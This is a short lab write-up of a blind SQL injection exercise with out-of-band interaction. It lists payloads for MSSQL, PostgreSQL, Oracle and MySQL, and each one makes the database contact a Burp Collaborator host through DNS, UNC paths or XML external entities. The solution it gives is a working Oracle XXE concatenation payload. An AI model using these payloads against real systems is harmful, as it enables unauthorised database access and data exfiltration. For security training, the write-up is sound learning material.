# Lab: Blind SQL injection with out-of-band interaction
## Description

1) I tried a bunch of stuff such as:
```
MSSQL
'%3bexec+master..xp_dirtree+'//dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net/a'--

PostgressSQL
'%3bcopy+(SELECT+'')+to+program+'nslookup+dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net'--

SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net')

exec master..xp_dirtree '//dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net/a'

copy (SELECT '') to program 'nslookup dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net'

LOAD_FILE('\\\\dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net\\a')

SELECT ... INTO OUTFILE '\\\\dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net\a'

SELECT users INTO OUTFILE '\\\\dvczx5oy75h3re10dcvhtyfs9jf93y.burpcollaborator.net\a'
```

I kinda gave up and decided to run the Burp Scanner against the target, which resulted in the lab being `Solved` and the SQL injection finding was identified as follows:

`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % yyrcn SYSTEM "http://aaou2o2c1kd18cnsrylgpvk1dsjmia8ycm59vxk.burpcollab'||'orator.net/">%yyrcn;]>'),'/l') from dual)||'`

Looking back, I spent most of my time trying to do stacked queries using `'; {PAYLOAD}` but instead I should have tried concatenation. For the sake of completeness here is how that works: 

``|| (PAYLOAD_GOES_HERE) ||'`

Great learning XP!


## Solution
`'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % yyrcn SYSTEM "http://aaou2o2c1kd18cnsrylgpvk1dsjmia8ycm59vxk.burpcollab'||'orator.net/">%yyrcn;]>'),'/l') from dual)||'`

